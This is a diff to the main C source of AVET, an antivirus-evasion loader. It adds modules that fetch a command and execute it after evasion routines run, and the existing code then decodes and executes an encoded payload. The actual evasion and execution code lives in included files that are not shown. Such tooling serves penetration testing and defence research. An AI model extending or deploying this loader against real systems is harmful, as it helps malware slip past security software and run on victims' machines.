@@ -40,6 +40,8 @@ Web: https://github.com/govolution/avet
 // Include implementation files needed for the selected functions.
 // The included files are assembled by the build script, in which functions are selected.
 #include "evasion/evasion.include"
+#include "command_exec/command_exec.include"
+#include "get_command/get_command.include"
 #include "get_payload/get_payload.include"
 #include "get_key/get_key.include"
 #include "get_payload_info/get_payload_info.include"
@@ -56,9 +58,12 @@ Web: https://github.com/govolution/avet
 // argv[1]		Is passed through as an argument to the get_payload function
 // argv[2]		Is passed through as an argument to the get_key function
 // argv[3]		Is passed through as an argument to the get_payload_info function
+// argv[4]		Is passed through as an argument to the get_command function
 int main (int argc, char **argv)
 {		
-	// Function prototype pointers to store selected functions.	
+	// Function prototype pointers to store selected functions.		
+	void (*command_exec) (const char *command, int command_size) = NULL;
+	unsigned char *(*get_command) (char *arg1, int *command_size) = NULL;
 	unsigned char *(*get_payload) (char *arg1, int *payload_size) = NULL;
 	unsigned char *(*get_key) (char *arg1, int *key_length) = NULL;
 	unsigned char *(*get_payload_info) (char *arg1, int *payload_info_length) = NULL;
@@ -86,12 +91,15 @@ int main (int argc, char **argv)
 	// Assign selected functions to prototypes
 	// Included assignment code is assembled by the build script
 	#include "evasion/evasion.assign"
+	#include "command_exec/command_exec.assign"
+	#include "get_command/get_command.assign"
 	#include "get_payload/get_payload.assign"
 	#include "get_key/get_key.assign"
 	#include "get_payload_info/get_payload_info.assign"
 	#include "decode_payload/decode_payload.assign"
 	#include "payload_execution_method/payload_execution_method.assign"
-			
+	
+	
 	// Execute evasion functions
 	if(evasion_functions[0] == NULL) {
 		DEBUG_PRINT("No evasion techniques applied.\n");
@@ -105,9 +113,32 @@ int main (int argc, char **argv)
 		}
 	}	
 	
+	
+	// Retrieve command to execute
+	int command_size = 0;
+	// If command is retrieve statically, set the argument accordingly to ensure that the correct data is delivered
+	#ifdef STATIC_COMMAND
+	char *command = get_command("static_command", &command_size);
+	#else
+	char *command = get_command(argv[4], &command_size);
+	#endif
+	if(command != NULL) {
+		DEBUG_PRINT("Retrieved command, size is %d bytes.\n", command_size);
+		for(int i = 0; i < command_size; i++) {
+			DEBUG_PRINT("%02x ", command[i]);
+		}
+		DEBUG_PRINT("\n\n");
+	} else {
+		DEBUG_PRINT("No command retrieved.\n");
+	}
+	// Execute command after evasion functions
+	DEBUG_PRINT("Calling command_exec...\n");
+	command_exec(command, command_size);
+	
+	
 	// Retrieve encoded payload
 	int payload_size = 0;
-	// If payload is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
+	// If payload is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
 	#ifdef STATIC_PAYLOAD	
 	unsigned char *encoded_payload = get_payload("static_payload", &payload_size);
 	#else
@@ -122,6 +153,7 @@ int main (int argc, char **argv)
 	} else {
 		DEBUG_PRINT("No payload retrieved.\n");
 	}
+	
 	
 	// Retrieve crypto key
 	int key_length = 0;
@@ -140,6 +172,7 @@ int main (int argc, char **argv)
 	} else {
 		DEBUG_PRINT("No key retrieved.\n");
 	}
+	
 	
 	// Retrieve additional payload info
 	int payload_info_length = 0;
@@ -163,7 +196,8 @@ int main (int argc, char **argv)
 	} else {
 		DEBUG_PRINT("No additional payload info retrieved.\n");
 	}
-		
+	
+	
 	// Decode payload
 	unsigned char* payload = (unsigned char *) malloc(payload_size);
 	DEBUG_PRINT("Calling decode_payload...\n");
@@ -173,6 +207,7 @@ int main (int argc, char **argv)
 	//	DEBUG_PRINT("%02x ", payload[i]);
 	//}
 	DEBUG_PRINT("\n\n");
+	
 	
 	// Bind and execute payload
 	DEBUG_PRINT("Calling payload_execution_method...\n");
